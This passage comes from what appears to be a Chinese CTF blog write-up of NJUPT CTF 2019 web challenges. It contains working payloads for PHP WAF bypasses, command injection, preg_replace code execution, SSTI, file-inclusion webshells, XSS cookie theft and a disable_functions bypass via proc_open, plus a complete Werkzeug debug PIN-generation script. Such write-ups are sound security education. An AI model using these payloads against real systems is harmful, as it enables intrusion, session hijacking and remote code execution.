class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3rd</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>三层 WAF，慢慢来</p>
<p>第一层：① %0a 绕过 preg_match() 的匹配</p>
<p>第二层：① 传入str1必须一个数字，通过<code>is_numeric()</code>；② 传入的str1和str2的md5值不能相等，所以不能一开始就传入md5加密后为0e+全数字的，必须经过strtr处理后变成0e+全数字；③ 经过<code>strtr()</code>替换后的md5值必须是0e开头（0的多少次方永远为0），并且0e后面全是数字。</p>
<p>那么str1和str2分别是：md5加密后，strtr()替换后为0e+全数字（就是没替换前是0e+除了c、x、h、p之外全是数字），md5加密后为0e+全数字</p>
<p>str1的爆破代码（<code>2120624</code>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,re</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span>(md5(str(i))[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">"0e"</span> <span class="keyword">and</span> re.search(<span class="string">"^[\dcxhp]*$"</span>,md5(str(i))[<span class="number">2</span>:])):</span><br><span class="line">		print(<span class="string">"[Success] "</span> + str(i) + <span class="string">"   ===&gt;   "</span> + md5(str(i)))</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(str(i) + <span class="string">"   ===&gt;   "</span> + md5(str(i)))</span><br><span class="line">		i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-3.png" alt="5-3"></p>
<p>str2的爆破代码（<code>240610708</code>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,re</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span>(md5(str(i))[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">"0e"</span> <span class="keyword">and</span> re.search(<span class="string">"^\d*$"</span>,md5(str(i))[<span class="number">2</span>:])):</span><br><span class="line">		print(<span class="string">"[Success] "</span> + str(i) + <span class="string">"   ===&gt;   "</span> + md5(str(i)))</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(str(i) + <span class="string">"   ===&gt;   "</span> + md5(str(i)))</span><br><span class="line">		i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-2.png" alt="5-2"></p>
<p>第三层：①传入的变量<code>q_w_q</code>长度不能超过8；②传入的<code>$_SERVER[&#39;QUERY_STRING&#39;]（也就是问号后面内容）</code>不能有<code>_</code>或者<code>%5f</code>。因为PHP会将传入的变量中的<code>点（.）</code>转换成为<code>下划线（_）</code>，所以可以绕过；③无法使用<code>ls</code>和<code>pwd</code>，我们可以用<code>dir</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=dir%20./</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-4.png" alt="5-4"></p>
<p>直接查看<code>flllag.php</code>的话会太长，于是使用通配符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=head%20fl*</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-5.png" alt="5-5"></p>
<h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-1.png" alt="6-1"></p>
<p><code>hint.php</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-2.png" alt></p>
<p>替换页面很像是<code>preg_replace()</code>函数的功能，直接尝试命令执行</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-3.png" alt="6-3"></p>
<p>没有<code>disable_functions</code>，测试发现过滤了引号</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-4.png" alt="6-4"></p>
<p>用<code>chr()</code>函数表示字符，用<code>.</code>拼接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub=1&amp;pat=1&amp;rep=show_source(chr(47).chr(102).chr(108).chr(97).chr(103))</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-5.png" alt="6-5"></p>
<p>或者这样</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-6.png" alt="6-6"></p>
<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-1.png" alt="7-1"></p>
<p>其他两个界面都正常，但是<code>SHA256</code>界面出现提示</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-2.png" alt="7-2"></p>
<p>测试其他路径，发现直接回显我们的输入</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-3.png" alt="7-3"></p>
<p>测试发现存在<code>SSTI</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-4.png" alt="7-4"></p>
<p>过滤了<code>flag</code>关键字</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-5.png" alt="7-5"></p>
<p>用字符串拼接绕过</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-6.png" alt="7-6"></p>
<h2 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-1.png" alt></p>
<p>根据题目提示，直接来到上传点</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-2.png" alt="8-2"></p>
<p>对上传类型有限制，更改<code>MIME</code>绕过；对文件中<code>?</code>进行过滤，改为<code>&lt;script language=&#39;php&#39;&gt;</code>绕过；对文件后缀有黑名单限制，先改为图片后缀上传试试，返回：filepath:/var/www/html/upload-imgs/8d6b295524ea3a2c2866443112613aa7/Th1s_is_a_fl4g.jpg</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-3.png" alt></p>
<p>后来发现这个<code>/uploaded-imgs</code>目录下是各个用户的文件夹，MD5加密后命名</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-4.png" alt></p>
<p> 并且每个文件夹里都只有一个<code>Th1s_is_a_fl4g.jpg</code>，没有其他东西，并且查看图片只会保存</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-5.png" alt></p>
<p>后来发现URL中的<code>action</code>参数存在任意文件包含</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-6.png" alt="8-6"></p>
<p>尝试包含刚才服务器返回给我们的<code>Th1s_is_a_fl4g.jpg</code>文件，直接拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-7.png" alt="8-7"></p>
<h2 id="flask-website"><a href="#flask-website" class="headerlink" title="flask_website"></a>flask_website</h2><p> SSRF爆破flask PIN码的漏洞，参考：<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553</a> </p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-1.png" alt="9-1"></p>
<p>爆破PIN码需要的参数如下：</p>
<blockquote>
<p>① username =&gt; 通过/etc/passwd获取</p>
<p>② flask目录下app.py的绝对路径 =&gt; 通过debug界面（<a href="http://addr:port/contact）爆破的路径获取" target="_blank" rel="noopener">http://addr:port/contact）爆破的路径获取</a></p>
<p>③ machine-id =&gt; 通过/etc/mechine-id或者/proc/sys/kernel/random/boot_id获取</p>
<p>​    （ 当/etc/machine-id为空时该参数为空，如不存在，则为/proc/sys/kernel/random/boot_id中的值 ）</p>
<p>④ mac地址 =&gt;  通过/sys/class/net/eth0/address获取（或者eth0换成ens33）</p>
</blockquote>
<p>① username（<code>ctf</code>）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-2.png" alt="9-2"></p>
<p>② flask目录下app.py的绝对路径（<code>/usr/local/lib/python3.6/site-packages/flask/app.py</code>）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-5.png" alt="9-5"></p>
<p>③ machine-id（一直在变化）</p>
<p>尝试<code>/etc/mechine-id</code>返回该文件不存在，尝试<code>/proc/sys/kernel/random/boot_id</code>返回结果也不对</p>
<p>然后去查看flask的获取pin的源码部分：<code>/usr/local/lib/python3.6/site-packages/werkzeug/debug/__init__.py</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-6.png" alt="9-6"></p>
<p>发现读取machine-id的文件其实是<code>/proc/self/cgroup</code>这个文件，访问取最后一个数据</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-3.png" alt="9-3"></p>
<p>④ MAC地址（<code>248537822003</code>）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-4.png" alt="9-4"></p>
<p>这里获取到的是<code>02:42:ac:16:00:02</code>，但是爆破需要转换成<code>十进制</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-7.png" alt="9-7"></p>
<p>输入爆破脚本，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'ctf'</span>,<span class="comment"># username	[+]modify here</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.6/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),	[+]modify here</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485378220034'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address	[+]modify here</span></span><br><span class="line">    <span class="string">'60cc9a7c60bda749da31c81cad6c73ce65cff336a9fc85d722fa6e9ea02d2661'</span><span class="comment"># get_machine_id(), /etc/machine-id	[+]modify here</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<p>爆破出PIN码（因为mathine-id一直在变化，所以爆破出来尽快使用）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-8.png" alt="9-8"></p>
<p>先打开<code>debug</code>，点击右边的小console，弹窗中输入PIN码</p>
<p>验证成功后就可以执行Python命令了，拿下 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-10.png" alt="9-10"></p>
<h2 id="simple-xss"><a href="#simple-xss" class="headerlink" title="simple_xss"></a>simple_xss</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/10-1.png" alt="10-1"></p>
<p>点击<code>register</code>注册一个用户，然后登陆</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/10-2.png" alt="10-2"></p>
<p>留言功能可以将留言提交给任意用户，测试发现存在XSS，但是有长度限制。利用XSS平台的链接，把留言弹给<code>admin</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/10-3.png" alt="10-3"></p>
<p>用拿到的cookie登录，拿下flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/10-4.png" alt="10-4"></p>
<h2 id="hacker-backdoor"><a href="#hacker-backdoor" class="headerlink" title="hacker_backdoor"></a>hacker_backdoor</h2><p>本题是inctf PHP1.0的变形，加上过滤了eval，assert函数</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-1.png" alt="11-1"></p>
<p>代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'useful'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">$usrful = $_GET[<span class="string">'useful'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    $dangerous = get_defined_functions();</span><br><span class="line">    array_push($dangerous[<span class="string">"internal"</span>], <span class="string">'eval'</span>, <span class="string">'assert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($dangerous[<span class="string">"internal"</span>] <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($a,$bad) !== <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($usrful))&#123;</span><br><span class="line">    <span class="keyword">if</span>(waf($code))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"oh,不能输入这些函数哦 :) "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>get_defined_functions()</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-2.png" alt="11-2"></p>
<p>其中</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-3.png" alt="11-3"></p>
<p>所以黑名单就是所有<code>内置函数</code>，然后再加上<code>eval()、assert()</code>。因为php可以按如下方式拼接成一个字符串，所以也就可以完美绕过 WAF</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-4.png" alt="11-4"></p>
<p>我们可以通过以下方式来执行命令</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-5.png" alt="11-5"></p>
<p>disable_function 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,</span><br><span class="line">pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,</span><br><span class="line">pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,</span><br><span class="line">pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,</span><br><span class="line">pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,</span><br><span class="line">error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,</span><br><span class="line">delete</span><br></pre></td></tr></table></figure>
<p>发现<code>proc_open()</code>没有被禁用，可以用过它来命令执行，查看flag。但是并不知道flag的路径，但是发现根目录下有<code>/readflag</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-6.png" alt="11-6"></p>
<p>跑这个文件应该就可以拿下flag，因为<code>proc_open()</code>没有直接地结果返回，我们可以将其结果输出到一个文件，再去读取这个文件，payload如下</p>
<p>Ps：题目环境不允许重复写文件，过后读也不行，所以打的时候换个文件，马上打马上读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=p.r.o.c._.o.p.e.n;$a(&quot;/readflag&gt;/tmp/knlvre&quot;,array(),$z);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-7.png" alt="11-7"></p>
<p>拿下flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=s.h.o.w._.s.o.u.r.c.e;$a(&quot;/tmp/knlvre&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-8.png" alt="11-8"></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='knlvre.github.io/statics/chengdu.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
                    <p>Knlvre</p>
                    <span>Think like an artist, develop like an artisan</span>
                    <dl>
                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">61 <p>Articles</p></a></li>
                    <li><a href="/categories">0 <p>Categories</p></a></li>
                    <li><a href="/tags">9 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UNCTF"><span class="toc-number">1.</span> <span class="toc-text">UNCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">1.1.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Do-you-like-xml"><span class="toc-number">1.2.</span> <span class="toc-text">Do you like xml?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#K-amp-K战队的老家"><span class="toc-number">1.3.</span> <span class="toc-text">K&amp;K战队的老家</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-web"><span class="toc-number">1.4.</span> <span class="toc-text">simple_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-upload"><span class="toc-number">1.5.</span> <span class="toc-text">simple_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#光坂镇的小诗1"><span class="toc-number">1.6.</span> <span class="toc-text">光坂镇的小诗1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSB-Reset-Password"><span class="toc-number">1.7.</span> <span class="toc-text">NSB_Reset_Password</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pentest"><span class="toc-number">1.8.</span> <span class="toc-text">easy_pentest</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第五届上海市大学生网络安全大赛"><span class="toc-number">2.</span> <span class="toc-text">第五届上海市大学生网络安全大赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bytectf-boring-code"><span class="toc-number">2.1.</span> <span class="toc-text">Bytectf boring_code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#decade"><span class="toc-number">2.2.</span> <span class="toc-text">decade</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyt5"><span class="toc-number">2.3.</span> <span class="toc-text">babyt5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysql"><span class="toc-number">2.4.</span> <span class="toc-text">easysql</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#湖湘杯复赛"><span class="toc-number">3.</span> <span class="toc-text">湖湘杯复赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#untar"><span class="toc-number">3.1.</span> <span class="toc-text">untar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp"><span class="toc-number">3.2.</span> <span class="toc-text">thinkphp?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#something-in-image"><span class="toc-number">3.3.</span> <span class="toc-text">something in image</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzMemory"><span class="toc-number">3.4.</span> <span class="toc-text">EzMemory</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#百越杯"><span class="toc-number">4.</span> <span class="toc-text">百越杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-number">4.1.</span> <span class="toc-text">babyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babygame"><span class="toc-number">4.2.</span> <span class="toc-text">babygame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#哈尔的移动城堡"><span class="toc-number">4.3.</span> <span class="toc-text">哈尔的移动城堡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-number">4.4.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#key"><span class="toc-number">4.5.</span> <span class="toc-text">key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WireLess"><span class="toc-number">4.6.</span> <span class="toc-text">WireLess</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#成都大学第二届玄武杯"><span class="toc-number">5.</span> <span class="toc-text">成都大学第二届玄武杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GET"><span class="toc-number">5.1.</span> <span class="toc-text">GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST"><span class="toc-number">5.2.</span> <span class="toc-text">POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WeekPassword"><span class="toc-number">5.3.</span> <span class="toc-text">WeekPassword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialization-1"><span class="toc-number">5.4.</span> <span class="toc-text">serialization-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#百度"><span class="toc-number">5.5.</span> <span class="toc-text">百度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-1"><span class="toc-number">5.6.</span> <span class="toc-text">SQL-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hash"><span class="toc-number">5.7.</span> <span class="toc-text">Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#矛盾"><span class="toc-number">5.8.</span> <span class="toc-text">矛盾</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NJUPT-CTF-2019"><span class="toc-number">6.</span> <span class="toc-text">NJUPT CTF 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fake-XML-cookbook"><span class="toc-number">6.1.</span> <span class="toc-text">Fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#True-XML-cookbook"><span class="toc-number">6.2.</span> <span class="toc-text">True XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLi"><span 